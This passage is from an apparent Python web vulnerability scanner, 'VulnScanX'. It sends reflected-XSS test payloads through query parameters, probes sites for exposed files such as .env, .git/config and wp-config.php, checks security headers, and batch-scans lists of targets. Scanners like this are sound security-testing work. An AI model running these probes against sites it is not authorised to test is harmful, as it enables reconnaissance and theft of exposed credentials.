        """Scan for XSS vulnerabilities"""
        vulnerabilities = []
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><script>alert("XSS")</script>'
        ]
        
        test_params = ['q', 'search', 'query', 'name', 'email']
        
        self.logger.info("Starting XSS scan")
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{target}?{param}={requests.utils.quote(payload)}"
                try:
                    headers = {'User-Agent': self.cms_detector.get_user_agent()}
                    response = requests.get(test_url, timeout=8, verify=False, headers=headers)
                    if payload in response.text:
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'Medium',
                            'description': f'Reflected XSS in parameter: {param}',
                            'url': test_url,
                            'fix': 'Implement proper input sanitization and output encoding'
                        })
                        break
                except requests.RequestException:
                    continue
                    
        return vulnerabilities

    def check_sensitive_files(self, target):
        """Check for sensitive file exposure"""
        sensitive_files = [
            '/.env', '/.git/config', '/backup.zip', '/database.sql',
            '/wp-config.php', '/configuration.php', '/settings.php',
            '/admin/', '/phpinfo.php', '/test.php', '/.htaccess'
        ]
        
        vulnerabilities = []
        self.logger.info("Checking for sensitive files")
        
        for file_path in sensitive_files:
            test_url = target.rstrip('/') + file_path
            try:
                headers = {'User-Agent': self.cms_detector.get_user_agent()}
                response = requests.get(test_url, timeout=5, verify=False, headers=headers)
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'Sensitive File Exposure',
                        'severity': 'High',
                        'description': f'Sensitive file accessible: {file_path}',
                        'url': test_url,
                        'fix': 'Restrict access to sensitive files and directories'
                    })
            except requests.RequestException:
                continue
                
        return vulnerabilities

    def generate_recommendations(self, security_report):
        """Generate security recommendations based on findings"""
        recommendations = []
        
        cms_name = security_report['cms_info']['name']
        if cms_name.lower() == 'wordpress':
            recommendations.append("Keep WordPress core, themes, and plugins updated")
            recommendations.append("Use strong passwords and limit login attempts")
            recommendations.append("Implement WordPress security plugins")
        elif cms_name.lower() == 'joomla':
            recommendations.append("Regularly update Joomla and extensions")
            recommendations.append("Change default administrator username")
            recommendations.append("Use Joomla security extensions")
        elif cms_name.lower() == 'drupal':
            recommendations.append("Keep Drupal core and modules updated")
            recommendations.append("Implement Drupal security best practices")
            
        #Adding recommendations for new vulnerabilities
       
        vuln_types = [vuln['type'] for vuln in security_report.get('vulnerabilities', [])]
        
        if 'SQL Injection' in str(vuln_types):
            recommendations.append("URGENT: Fix SQL Injection vulnerabilities using parameterized queries")
        
        if 'XSS' in str(vuln_types):
            recommendations.append("Implement Content Security Policy and input sanitization for XSS")
        
        if 'LFI' in str(vuln_types) or 'File Inclusion' in str(vuln_types):
            recommendations.append("Restrict file path access and implement whitelists for file operations")
        
        if 'Command Injection' in str(vuln_types):
            recommendations.append("CRITICAL: Avoid shell command execution with user input")
        
        headers = security_report.get('security_headers', {})
        if headers.get('Content-Security-Policy') == 'Missing':
            recommendations.append("Implement Content Security Policy header")
        if headers.get('Strict-Transport-Security') == 'Missing':
            recommendations.append("Implement HSTS header")
        if headers.get('X-Frame-Options') == 'Missing':
            recommendations.append("Implement X-Frame-Options to prevent clickjacking")
            
        for vuln in security_report.get('vulnerabilities', []):
            if vuln['severity'] == 'High':
                recommendations.append(f"Immediately fix: {vuln['description']}")
                
        return recommendations

    def save_security_report(self, report, target):
        """Save security report to file"""
        try:
            domain = urlparse(target).netloc
            report_dir = Path(f"Result/{domain}")
            report_dir.mkdir(parents=True, exist_ok=True)
            
            report_file = report_dir / "security_report.json"
            with open(report_file, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=4, ensure_ascii=False)
                
            self.logger.success(f"Security report saved: {report_file}")
            return str(report_file)
        except Exception as e:
            self.logger.error(f"Failed to save security report: {e}")
            return None

    def display_report(self, report):
        """Display security report in readable format"""
        print(f"\n{Logger.CYAN}{'='*70}{Logger.END}")
        print(f"{Logger.BOLD}{Logger.MAGENTA}              SECURITY SCAN REPORT{Logger.END}")
        print(f"{Logger.CYAN}{'='*70}{Logger.END}")
        
        print(f"{Logger.BOLD}Target:{Logger.END} {report['target']}")
        print(f"{Logger.BOLD}Scan Date:{Logger.END} {report['scan_date']}")
        
        if report['cms_info']['name'] != 'Unknown':
            version_text = f" v{report['cms_info']['version']}" if report['cms_info']['version'] != 'Unknown' else ""
            confidence_color = Logger.GREEN if report['cms_info']['confidence'] == 'High' else Logger.YELLOW
            print(f"{Logger.BOLD}CMS:{Logger.END} {report['cms_info']['name']}{version_text} "
                  f"({confidence_color}{report['cms_info']['confidence']} confidence{Logger.END})")
        
        vulnerabilities = report.get('vulnerabilities', [])
        if vulnerabilities:
            print(f"\n{Logger.RED}{Logger.BOLD}VULNERABILITIES FOUND: {len(vulnerabilities)}{Logger.END}")
            for vuln in vulnerabilities:
                severity_color = Logger.RED if vuln['severity'] == 'High' else Logger.YELLOW
                print(f"\n{severity_color}[{vuln['severity']}]{Logger.END} {vuln['type']}")
                print(f"  Description: {vuln['description']}")
                if 'url' in vuln:
                    print(f"  URL: {vuln['url']}")
                print(f"  Fix: {vuln['fix']}")
        else:
            print(f"\n{Logger.GREEN}{Logger.BOLD}✓ No vulnerabilities found!{Logger.END}")
        
        print(f"\n{Logger.BLUE}{Logger.BOLD}SECURITY HEADERS:{Logger.END}")
        headers = report.get('security_headers', {})
        for header, value in headers.items():
            status = f"{Logger.GREEN}PRESENT{Logger.END}" if value != 'Missing' else f"{Logger.RED}MISSING{Logger.END}"
            print(f"  {header}: {status}")
        
        recommendations = report.get('recommendations', [])
        if recommendations:
            print(f"\n{Logger.YELLOW}{Logger.BOLD}RECOMMENDATIONS:{Logger.END}")
            for rec in recommendations:
                print(f"  • {rec}")

    def target_input(self, prompt="Enter target URL: "):
        """Get target URL from user input"""
        while True:
            url = input(prompt).strip()
            processed_url = self.process_url(url)
            if processed_url:
                return processed_url
            self.logger.error("Invalid URL. Please enter a valid URL (e.g., example.com or https://example.com)")

    def clear_screen(self):
        """Clear terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def bye(self):
        """Exit the application"""
        self.logger.info("Thank you for using VulnScanX!")
        sys.exit(0)

    def handle_quit(self, prompt=True):
        """Handle quit operations"""
        if prompt:
            input('\nPress [ENTER] to continue')

def main():
    if sys.version_info < (3, 6):
        print("\nPython 3.6 or higher is required to run VulnScanX\n")
        sys.exit(1)
    
    scanner = VulnScanX()
    
    parser = argparse.ArgumentParser(prog='vulnscanx.py', description='VulnScanX - Advanced Security Scanner', add_help=False)
    
    cms_group = parser.add_argument_group('CMS Detection & Scanning')
    cms_group.add_argument('--cms-scan', action='store_true', help='Advanced CMS detection only')
    cms_group.add_argument('--wp-scan', action='store_true', help='WordPress-specific vulnerability scan')
    cms_group.add_argument('--joomla-scan', action='store_true', help='Joomla-specific vulnerability scan')
    
    security_group = parser.add_argument_group('Security Scanning')
    security_group.add_argument('--deep-scan', action='store_true', help='Perform deep security scan')
    security_group.add_argument('--check-headers', action='store_true', help='Check security headers')
    security_group.add_argument('--scan-sql', action='store_true', help='Scan for SQL injection')
    security_group.add_argument('--scan-xss', action='store_true', help='Scan for XSS vulnerabilities')
    security_group.add_argument('--full-audit', action='store_true', help='Complete security audit')
    
    general_group = parser.add_argument_group('General Options')
    general_group.add_argument('-h', '--help', action="store_true", help='Show help message')
    general_group.add_argument('-v', '--verbose', action="store_true", help='Verbose output')
    general_group.add_argument("--version", action="store_true", help='Show version')
    
    target_group = parser.add_argument_group('Target Specification')
    target_group.add_argument('-u', '--url', help='Target URL to scan')
    target_group.add_argument('-l', '--list', help='Scan multiple sites from file')
    target_group.add_argument('--batch', action="store_true", help='Batch mode')
    
    args = parser.parse_args()

    if args.help:
        scanner.display_logo()
        print(f"""
{Logger.BOLD}VulnScanX v{scanner.version} - Comprehensive Security Scanner{Logger.END}

{Logger.BOLD}USAGE:{Logger.END}
    python3 vulnscanx.py [OPTIONS]

{Logger.BOLD}ADVANCED CMS DETECTION:{Logger.END}
    --cms-scan            Advanced CMS detection
    --wp-scan             WordPress-specific vulnerability scan
    --joomla-scan         Joomla-specific vulnerability scan

{Logger.BOLD}SECURITY SCANNING:{Logger.END}
    --deep-scan            Perform deep security scan
    --check-headers        Check security headers
    --scan-sql             Scan for SQL injection
    --scan-xss             Scan for XSS vulnerabilities
    --full-audit           Complete security audit

{Logger.BOLD}EXAMPLES:{Logger.END}
    python3 vulnscanx.py -u https://example.com --cms-scan
    python3 vulnscanx.py -u https://example.com --wp-scan
    python3 vulnscanx.py -u https://example.com --full-audit
    python3 vulnscanx.py -l targets.txt --batch
        """)
        sys.exit(0)

    if args.version:
        print(f"VulnScanX Version: {scanner.version}")
        sys.exit(0)

    # Display the logo only when needed, not always
    if args.cms_scan or args.wp_scan or args.joomla_scan or args.deep_scan or args.check_headers or args.scan_sql or args.scan_xss or args.full_audit:
        scanner.display_logo()
        scanner.display_banner()

    if args.cms_scan:
        if args.url:
            target = scanner.process_url(args.url)
            if target:
                cms_info = scanner.advanced_cms_detection(target)
                scanner.display_cms_info(cms_info)
            else:
                scanner.logger.error("Invalid URL provided")
        else:
            scanner.logger.error("URL is required for CMS detection (-u, --url)")
        sys.exit(0)

    if args.wp_scan:
        if args.url:
            target = scanner.process_url(args.url)
            if target:
                scanner.logger.info(f"Starting WordPress-specific scan for: {target}")
                cms_info = scanner.advanced_cms_detection(target)
                if cms_info['name'].lower() == 'wordpress':
                    vulnerabilities = scanner.wordpress_scan(target)
                    report = {
                        'target': target,
                        'scan_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                        'cms_info': cms_info,
                        'vulnerabilities': vulnerabilities,
                        'security_headers': {},
                        'recommendations': []
                    }
                    scanner.display_report(report)
                    scanner.save_security_report(report, target)
                else:
                    scanner.logger.error("Target is not running WordPress")
            else:
                scanner.logger.error("Invalid URL provided")
        else:
            scanner.logger.error("URL is required for WordPress scan (-u, --url)")
        sys.exit(0)

    if any([args.deep_scan, args.check_headers, args.scan_sql, args.scan_xss, args.full_audit]):
        if args.url:
            target = scanner.process_url(args.url)
            if target:
                scanner.logger.info(f"Starting security scan for: {target}")
                security_report = scanner.advanced_security_scan(target)
                scanner.save_security_report(security_report, target)
                scanner.display_report(security_report)
            else:
                scanner.logger.error("Invalid URL provided")
        else:
            scanner.logger.error("URL is required for security scanning (-u, --url)")
        sys.exit(0)

#Interactive mode
    scanner.clear_screen()
    scanner.display_logo()
    scanner.display_banner()
    
    print(" Command    Description")
    print("=========  ==============================")
    print(" [1]       Advanced CMS Detection")
    print(" [2]       WordPress Security Scan")
    print(" [3]       Joomla Security Scan")
    print(" [4]       Full Security Audit")
    print(" [5]       Scan Multiple Sites")
    print(" [6]       Security Headers Check")
    print(" [0]       Exit VulnScanX\n")

    choice = input("Select Option: ").lower()
    
    if choice == '0':
        scanner.bye()
    elif choice == '1':
        scanner.clear_screen()
        scanner.display_logo()
        site = scanner.target_input("Enter target URL: ")
        cms_info = scanner.advanced_cms_detection(site)
        scanner.display_cms_info(cms_info)
        scanner.handle_quit()
    elif choice == '2':
        scanner.clear_screen()
        scanner.display_logo()
        site = scanner.target_input("Enter WordPress site URL: ")
        cms_info = scanner.advanced_cms_detection(site)
        if cms_info['name'].lower() == 'wordpress':
            vulnerabilities = scanner.wordpress_scan(site)
            report = {
                'target': site,
                'scan_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'cms_info': cms_info,
                'vulnerabilities': vulnerabilities,
                'security_headers': {},
                'recommendations': []
            }
            scanner.display_report(report)
            scanner.save_security_report(report, site)
        else:
            scanner.logger.error("Target is not running WordPress")
        scanner.handle_quit()
    elif choice == '3':
        scanner.clear_screen()
        scanner.display_logo()
        site = scanner.target_input("Enter Joomla site URL: ")
        cms_info = scanner.advanced_cms_detection(site)
        if cms_info['name'].lower() == 'joomla':
            vulnerabilities = scanner.joomla_scan(site)
            report = {
                'target': site,
                'scan_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'cms_info': cms_info,
                'vulnerabilities': vulnerabilities,
                'security_headers': {},
                'recommendations': []
            }
            scanner.display_report(report)
            scanner.save_security_report(report, site)
        else:
            scanner.logger.error("Target is not running Joomla")
        scanner.handle_quit()
    elif choice == '4':
        scanner.clear_screen()
        scanner.display_logo()
        site = scanner.target_input("Enter target URL for security audit: ")
        security_report = scanner.advanced_security_scan(site)
        scanner.save_security_report(security_report, site)
        scanner.display_report(security_report)
        scanner.handle_quit()
    elif choice == '5':
        scanner.clear_screen()
        scanner.display_logo()
        sites_input = input('Enter comma separated URLs or file path: ').strip()
        sites_list = []
        
        if os.path.isfile(sites_input):
            scanner.logger.info('Treating input as file path')
            try:
                with open(sites_input, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                    sites_list = [site.strip() for site in content.split(',') if site.strip()]
            except IOError as e:
                scanner.logger.error(f'Error reading file: {e}')
                scanner.bye()
        else:
            scanner.logger.info('Treating input as URL list')
            sites_list = [site.strip() for site in sites_input.split(',') if site.strip()]
            
        if sites_list:
            for site in sites_list:
                target = scanner.process_url(site)
                if target:
                    scanner.logger.info(f"Scanning: {target}")
                    security_report = scanner.advanced_security_scan(target)
                    scanner.save_security_report(security_report, target)
                    scanner.display_report(security_report)
                    input('\nPress [ENTER] to continue')
                else:
                    scanner.logger.warning(f'Invalid URL: {site} - Skipping')
            scanner.logger.info('Scanning completed. Results saved in respective directories.')
        else:
            scanner.logger.error("No valid URLs provided.")
        scanner.bye()
    elif choice == '6':
        scanner.clear_screen()
        scanner.display_logo()
        site = scanner.target_input("Enter target URL for headers check: ")
        headers = scanner.check_security_headers(site)
        print("\nSECURITY HEADERS ANALYSIS:")
        print("="*40)
        for header, value in headers.items():
            status = Logger.GREEN + "PRESENT" + Logger.END if value != 'Missing' else Logger.RED + "MISSING" + Logger.END
            print(f"{header}: {status}")
        scanner.handle_quit()
    else:
        scanner.logger.error("Invalid selection!")
        scanner.bye()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Logger.RED}Scan interrupted by user{Logger.END}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Logger.RED}Unexpected error: {e}{Logger.END}")
        sys.exit(1)